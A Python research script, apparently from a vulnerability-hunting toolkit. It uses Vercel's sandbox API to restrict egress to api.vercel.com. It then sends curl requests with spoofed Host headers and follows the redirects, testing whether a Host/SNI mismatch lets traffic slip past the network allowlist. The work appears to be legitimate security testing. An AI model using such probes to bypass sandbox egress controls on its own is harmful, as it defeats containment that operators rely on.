# -*- coding: utf-8 -*-
"""重定向语义分析: 抓 Location + 跟随重定向看最终到达
核心问题: 307/308/302 的 Location 指向 Host 还是 SNI? 跟随后能否到达目标内容?
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

ECHO = 'sbx-echo-e29ca9cb.vercel.app'
ECHO2 = 'sbx-echo-e29ca9cb-fwvcn8jon-pccp-team.vercel.app'

def get_sandbox(name):
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    if d['sandbox'].get('status') != 'running':
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (name, TEAM, PROJ))
        d = json.loads(r)
        sid = d['sandbox']['currentSessionId']
        print('[%s] resumed sid: %s' % (name, sid), flush=True)
        time.sleep(5)
    return sid

def set_policy(sid, body, tag):
    c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), body)
    print('[%s] set_policy http=%d' % (tag, c), flush=True)
    time.sleep(3)

def run(sid, tag, sc):
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=60000)
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    print('[%s] %s' % (tag, out[:800]), flush=True)

sid = get_sandbox('tinj1')
print('sid:', sid, flush=True)
set_policy(sid, {"mode": "custom", "allowedDomains": ["api.vercel.com"]}, 'ALLOW-API')

# 1. Location 头
for tag, host in [('L1-vercelcom', 'vercel.com'), ('L2-www', 'www.vercel.com'), ('L3-vercelapp', 'vercel.app'),
                  ('L4-echo-dep', ECHO2), ('L5-ip', '1.1.1.1')]:
    sc = ('curl -s -D - -o /dev/null -m 10 --http1.1 https://api.vercel.com/anything -H "Host: %s" 2>&1 | grep -iE "^(HTTP|location|server|set-cookie)" | head -6' % host)
    run(sid, tag, sc)

# 2. 跟随重定向
for tag, host in [('F1-vercelcom', 'vercel.com'), ('F2-echo-dep', ECHO2)]:
    sc = ('curl -s -L -o /dev/null -w "FINAL:%{http_code} url:%{url_effective}" -m 15 --http1.1 https://api.vercel.com/anything -H "Host: %s" 2>&1 | head -1' % host)
    run(sid, tag, sc)

# 3. 直接对 echo-dep 发起 (SNI=echo-dep, 需 allowlist) 对照 token
set_policy(sid, {"mode": "custom", "allowedDomains": [ECHO2]}, 'ALLOW-ECHO2')
sc = ('curl -s -m 15 "https://%s/x" 2>&1 | head -c 600' % ECHO2)
run(sid, 'E1-direct-echo2', sc)

print('=== REDIR DONE ===', flush=True)
